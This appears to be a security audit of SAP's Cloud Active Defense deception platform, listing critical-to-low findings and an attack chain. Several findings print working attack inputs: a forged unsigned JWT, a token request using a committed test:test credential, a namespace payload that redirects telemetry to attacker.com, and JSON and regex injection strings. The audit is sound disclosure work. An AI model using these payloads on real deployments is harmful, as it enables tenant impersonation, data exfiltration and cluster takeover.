# SAP Cloud Active Defense — Security Analysis

**Repo:** https://github.com/SAP/cloud-active-defense  
**Type:** Kubernetes-based deception platform — Envoy WASM filter + Node.js control panel + Keycloak auth + decoy injection + FluentBit telemetry  
**Lanes:** 5 parallel (API routes/auth/middleware · Nginx/configmanager/K8s · DB models/services/isolation · secrets/Keycloak/fingerprints · injection/SSRF/attack surface)

---

## Summary

| Severity | Count |
|----------|-------|
| CRITICAL | 9 |
| HIGH | 14 |
| MEDIUM | 9 |
| LOW | 8 |

The auth layer has two independent critical failures that chain: JWT signatures are never verified (C1), and the tenant isolation predicate has an operator-precedence bug that makes it always pass (C2). Together they yield zero-auth full cross-tenant access to all decoy configs, logs, and captured intelligence — before touching any of the other 7 critical findings. The deployment manager has a separate injection chain (inverted input validation → FluentBit newline injection → telemetry exfil) that doesn't require the auth bypass.

---

## CRITICAL

### C1 — middleware/customer-authorization.js:46-57 — JWT signature never verified; identity is fully forgeable

`extractCustomersFromToken` manually splits on `.`, base64-decodes the payload, and trusts the `groups` claim directly. No call to `jwt.verify()`, no Keycloak introspection, no JWKS signature check. The signature segment is discarded.

**Trigger:** `Authorization: Bearer eyJhbGciOiJub25lIn0.<base64({"groups":"victim-customer"})>.`  
**Impact:** Impersonate any tenant without a valid Keycloak token. All `keycloak.protect()`-gated routes become tenant-impersonation vectors.

---

### C2 — middleware/customer-authorization.js:17,42 — IDOR predicate operator-precedence bug; always passes

```javascript
if (!customer_id == protectedApp.customer.id)  // line 17
if (!customer_id == decoy.protectedApp.cu_id)  // line 42
```

JS evaluates `!customer_id` first. Since `customer_id` is a truthy UUID string, `!customer_id === false`. Then `false == "some-uuid-string"` is always `false`. The 403 branch is unreachable. Every authenticated user can read, write, and delete every other tenant's decoys, configs, protected apps, and logs.

**Fix:** `if (customer_id !== protectedApp.customer.id)`  
**Chain with C1:** C1 + C2 = zero-auth full cross-tenant access.

---

### C3 — server.js:39 + routes/user.js:7,20,33,60,73,86,99 — All user management endpoints unauthenticated

`app.use('/user', user)` mounts the user router with no middleware. Seven endpoints defined — `GET /:id`, `POST /`, `PUT /:id`, `DELETE /:id`, `PUT /:id/password`, `PUT /:id/roles`, `POST /:id/pic` — with no auth on any of them. `PUT /:id/roles` is a direct privilege escalation surface. Additionally, `routes/user.js:101` hardcodes an empty array instead of `req.body.roles`, so role assignment always clears roles regardless of request body.

---

### C4 — server.js:36 — `/statistics` router mounted unauthenticated

`app.use('/statistics', statistics)` has no `keycloak.protect()` and no API key middleware. Currently a stub; the route is fully open.

---

### C5 — clone/myapp.js:174,145 — Hardcoded `bob:bob` credentials + static session UUID in every deployment

```javascript
username === 'bob' && password === 'bob'
SESSION cookie === 'c32272b9-99d8-4687-b57e-a606952ae870'
```

The credential pair and session UUID are compiled into the image and visible in the public repo. Any attacker sets `Cookie: SESSION=c32272b9-99d8-4687-b57e-a606952ae870` and bypasses login without triggering the credential capture. The deception fails at first contact against any attacker who reads the source.

---

### C6 — keycloak/realm-import.json:50-52 — Committed Keycloak `test:test` credential auto-imported into every deployment

```json
{ "type": "password", "value": "test" }
```

Username `test`, password `test`, seeded into every Keycloak instance on first boot via realm import. Combined with `directAccessGrantsEnabled: true` on a `publicClient: true` client (no client secret required), ROPC token grant succeeds with no prior knowledge:

```
POST /realms/cad/protocol/openid-connect/token
grant_type=password&username=test&password=test&client_id=cad
```

Full authenticated JWT returned.

---

### C7 — deployment-manager/util/index.js:19-26 — Inverted input validation: every name UNDER 63 chars passes, breaking namespace sanitization

`isValidNamespaceName` and `isValidDeploymentName` return `true` only when `regex.test(name) && name.length >= 63`. All callers treat `true` as invalid and reject it. This means: every name under 63 chars — including those with `"`, `\n`, `\`, `/`, spaces, shell metacharacters — passes validation and reaches downstream consumers. The two functions are structurally inverted: they implement `isTooLongValidName`, not `isValidName`.

---

### C8 — deployment-manager/services/telemetry.js:72 — FluentBit config newline injection via namespace parameter

```javascript
output: { custom: `name http\nhost controlpanel-api-service.${namespace}.svc.cluster.local\nuri /logs\nformat json\nheader Authorization ${API_KEY}` }
```

`namespace` is validated only by the inverted check (C7), which passes any string under 63 chars. A namespace like `x.svc.cluster.local\nhost attacker.com\nuri /exfil\nname http` injects additional FluentBit output directives, redirecting all decoy-triggered security alerts to an attacker-controlled endpoint. The custom config string is passed verbatim to the `logpipelines` CRD.

**Impact:** Exfiltration of all honeypot telemetry including captured session tokens and attacker IPs.

---

### C9 — deployment-manager/services/envoy.js:116 — JSON injection in Envoy filter config via deploymentName/namespace

```javascript
value: `{"ENVOY_API_KEY": "${apiKey}", "DEPLOYMENT": "${deploymentName}", "NAMESPACE": "${namespace}"}`
```

Both `deploymentName` and `namespace` reach here unescaped (validated only by C7's inverted check). A `deploymentName` of `foo","EVIL":"injected` produces a structurally modified JSON object embedded in the Envoy WASM filter's configuration value. Allows overwriting `DEPLOYMENT` and `NAMESPACE` context values inside the running filter.

---

## HIGH

### H1 — kyma/charts/deployment-manager/templates/deployment-manager-cr.yaml — ClusterRole grants cluster-wide secret patch

```yaml
- verbs: [patch]
  apiGroups: ['']
  resources: [secrets]
```

No `resourceNames` restriction, no namespace binding (ClusterRole + ClusterRoleBinding). The deployment-manager service account can patch ANY Kubernetes Secret in ANY namespace, including `kube-system` secrets, PKI secrets, and other tenants' kubeconfig secrets. Compromise of the deployment-manager process (via C8/C9) yields cluster credential takeover.

---

### H2 — models/Api-key.js:12 + services/customer.js:58-61 — API keys stored plaintext in Postgres

`key` field is `DataTypes.STRING` — stored and queried by raw value. DB read access = full key compromise across all tenants. Kubeconfig-level cluster access follows.

---

### H3 — services/customer.js:28-32 — Kubeconfig stored plaintext in Postgres

`kubeconfig: DataTypes.TEXT` — full kubeconfig written to `customers` table unencrypted. Kubeconfigs carry cluster CA, client cert, and bearer tokens. Any Postgres read on `customers` (deployment_manager user has SELECT grant; SQL injection; DB backup exposure) yields cluster admin credential for every onboarded customer cluster.

---

### H4 — services/logs.js:148-153 — Cross-tenant log injection

`ProtectedApp.findOne({ where: { namespace: log.namespace, application: log.application }})` — no `cu_id` binding. Any caller with a valid fluentbit API key for their own tenant can write logs into any other tenant's log stream by supplying a known target namespace+application pair. Enables log poisoning and false alert suppression in any tenant's deception platform.

---

### H5 — services/protected-app.js:41-47 — Cross-tenant default-app copy at provisioning

`ProtectedApp.findOne({ where: { namespace: 'default', application: 'default' }})` has no `cu_id` filter. Returns whichever tenant's default app is first in the DB; that tenant's decoy configuration is bulk-copied into the new customer's protected app at provisioning time.

---

### H6 — keycloak/realm-import.json:8-9 — Public client + Direct Access Grants + wildcard CORS

`"publicClient": true`, `"directAccessGrantsEnabled": true`, `"webOrigins": ["*"]`. ROPC flow requires no client secret. Any origin can initiate token requests. Brute-force has no client-layer friction even if the `test:test` credential (C6) is rotated.

---

### H7 — routes/decoys.js:198 — `/decoys/upload/:pa_id` missing customer authorization

`authorizationFromPa_id` present on `GET /decoys/:pa_id` (line 85) but absent on the upload route. Any authenticated user (any tenant) can upload decoys into any other tenant's `pa_id`, overwriting their honeypot configuration.

---

### H8 — routes/decoys.js:267 — `GET /decoys/download-errors/:filename` — no customer authorization

No authorization middleware. Any authenticated user can download error files belonging to any tenant.

---

### H9 — deployment-manager/services/envoy.js:187,192 + telemetry.js:115 — Undefined variables crash `renewApiKey` in both services

`renewApiKey` in `envoy.js` dereferences `k8sCore.readNamespace` (line 187) and `k8sApp.readNamespacedDeployment` (line 192) — both `undefined`. Any call to the key renewal endpoint throws `TypeError: Cannot read properties of undefined`. Same pattern in `telemetry.renewApiKey:115` (`k8sApp` undeclared). Any authenticated customer who has previously installed CAD gets a reliable DoS against key rotation.

---

### H10 — clone/myapp.js:10-17 — Full credential logging to stdout unconditionally

The middleware logs `requestBody` and `requestHeaders` for every request before route handlers run. POST `/login` sends `username` and `password` in the body — captured verbatim to the FluentBit log stream. Any log aggregation system ingesting stdout has plaintext attacker credential access.

---

### H11 — clone/myapp.js:21-26,138 — "CLONE" string self-identifies honeypot at first HTTP GET

`${'CLONE'.split('').map(letter => `<span class="letter">${letter}</span>`).join('')}` renders the word CLONE as semantic text in the homepage. CSS class `.label` and `<div class="label">CLONE</div>` also present. Any attacker who `curl`s the root sees the honeypot's identity in the first response.

Additionally: `app.listen(2000)` but `console.log("Listening on port 3000...")` — the logged port differs from the actual listen port, a further implementation signal in container logs.

---

### H12 — deployment-manager/util/index.js:1-9 — Non-CSPRNG (`Math.random()`) for API key generation

`generateRandomString` uses `Math.floor(Math.random() * ...)`. Used for Envoy filter API key (65 chars), FluentBit API key (65 chars), and Keycloak API key. V8's XorShift128+ PRNG state is recoverable from ~2-3 observed outputs. Keys are predictable; an attacker who observes two keys can reconstruct state and predict all future and past keys.

---

### H13 — logs.js:80,99 — Regex injection into PostgreSQL iRegexp via `operand` parameter

`?SourceIp=like:ATTACKER_INPUT` interpolated directly into a PostgreSQL operator-class regex string: `` {[Op.iRegexp]: `"${key}"\\s*:\\s*".*${operand}.*"`} ``. Attacker can inject arbitrary PostgreSQL regex syntax for: ReDoS at DB layer, logical filter bypass (`|.*` matches all rows), or unintended data disclosure.

---

### H14 — services/customer.js:23-24 — Kubeconfig upload uses `path.resolve` without `fs.realpathSync` — symlink attack

`path.resolve` does not resolve symlinks; only `fs.realpathSync` does. If an attacker can create a symlink inside `uploads/kubeconfig/` (via race condition or another upload path), the `startsWith(UPLOADS_DIR)` check passes and `fs.readFileSync` follows the symlink. File contents stored as the customer's kubeconfig and executed against the k8s API. Contrast with `decoys.js:35` which correctly calls `fs.realpathSync`.

---

## MEDIUM

### M1 — services/deployment-manager.js:21 — No validation on namespace/deploymentAppName in installCADToApp

`getDeployments` validates namespace with a regex before forwarding. `installCADToApp` and `uninstallCADToApp` accept arbitrary strings for both parameters and forward them unsanitized to the internal deployment-manager via axios. Path delimiters, newlines, or HTTP header-injection sequences in `namespace` corrupt the internal request.

---

### M2 — deployment-manager/services/telemetry.js:63-68 — Infinite loop on unready cluster

```javascript
while (telemetry_up) {
    if (state == 'Ready') telemetry_up = false;
    await sleep(6000);
}
```

No timeout, no max iteration count. If the Kyma telemetry module never reaches Ready, the loop runs indefinitely. Multiple concurrent authenticated install requests on non-ready clusters stall the deployment-manager process.

---

### M3 — util/rate-limiting.js:3-6 — In-memory rate limiter; ineffective in multi-pod K8s deployments

`express-rate-limit` without an external store (Redis, etc.) tracks per-process. In any Kubernetes deployment with >1 replica, each pod maintains an independent counter. An attacker distributing requests across pods gets `100 × N` effective requests per window.

---

### M4 — util/blocklist.js:59-62 — Blocklist behavior priority inverted; `clone` overrides `drop`

`priorities = { clone: 1, exhaust: 2, drop: 3, error: 4 }` with `isNewBlocklistBehaviorPriority` returning true when new priority number < existing. A new `clone` entry (priority 1) replaces an existing `drop` (priority 3) entry for the same source. Intended escalation order is reversed.

---

### M5 — keycloak.js:8 — SSL not required for internal Keycloak communication

`"ssl-required": "external"` — token exchange between controlpanel-api and Keycloak is plain HTTP inside the cluster. Any pod with network access to the Keycloak service can intercept JWTs in transit.

---

### M6 — util/index.js:36-42 — Non-CSPRNG (`Math.random()`) for token generation in control panel

`generateRandomString` uses `Math.random()` for session tokens and temporary keys. Should be `crypto.randomBytes`.

---

### M7 — models/Api-key.js:29 + Blocklist.js:25 — API key expiration computed at module load time

`defaultValue: new Date(...)` evaluated once at `require()`. Every API key issued after server start gets the same fixed expiration timestamp (server_start + 1 year), not (creation_time + 1 year). Long-lived servers produce keys that expire simultaneously.

---

### M8 — controlpanel/cad/nginx.conf — Plain HTTP only; no security headers

`listen 80` only; no `ssl_certificate`, no `Content-Security-Policy`, `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`, or `HSTS`. All control panel session tokens transmitted in cleartext.

---

### M9 — kyma/charts/ — No Kubernetes NetworkPolicy defined

No NetworkPolicy manifests anywhere in the Helm tree. Any compromised pod can reach the deployment-manager REST API on port 3000 directly, without traversing Keycloak authentication.

---

## LOW

- **services/decoys.js:90-91** — `path.resolve` without `+ path.sep` in path boundary check; sibling directories whose names share the prefix escape containment.
- **models/index.js:68** — `Logs` lacks `references:` FK declaration; orphaned log records with arbitrary `pa_id` possible via raw DDL migration.
- **logs.js:22-27** — Implicit global variable declarations (no `const`/`let`/`var`); future `await` insertion before `Logs.findAll()` would cause cross-request filter bleed.
- **index.js:41** — `process.env.DEPLOYMENT_MANAGER_PASSWORD || 'deployment_manager'` — username equals password default.
- **keycloak/realm-import.json:36** — `"redirectUris": ["http://localhost/*"]` — breaks all non-localhost deployments; operators who fix by adding `*` create open redirect.
- **proxy/envoy.yaml:28** — `"ENVOY_API_KEY": "<ENVOY_API_KEY>"` placeholder with no enforcement of substitution.
- **routes/user.js:101** — `userService.updateUserRoles(req.params.id, [])` hardcodes empty array instead of `req.body.roles`; role assignment always clears roles.
- **customer.js:58** — Missing `+ path.sep` in kubeconfig upload boundary check (same pattern as decoys.js but in a higher-trust context).

---

## Attack Chain

```
Unauthenticated                     Authenticated (any tenant)
        │                                    │
   C1: forge JWT                        C2: IDOR always passes
   (any groups claim)                   (any tenant's data)
        │                                    │
        └──────────────┬─────────────────────┘
                       │
              Full cross-tenant access:
              decoys · configs · logs · kubeconfigs
                       │
               C3: kubeconfigs → cluster admin
                       │
               H1: ClusterRole secret patch
               → any K8s secret in any namespace

Separate chain (no auth bypass needed):
        C7 inverted validation
        → C8 FluentBit newline injection
        → telemetry exfil to attacker endpoint
        → C9 Envoy filter JSON injection
        → H1 cluster-wide secret patch
```
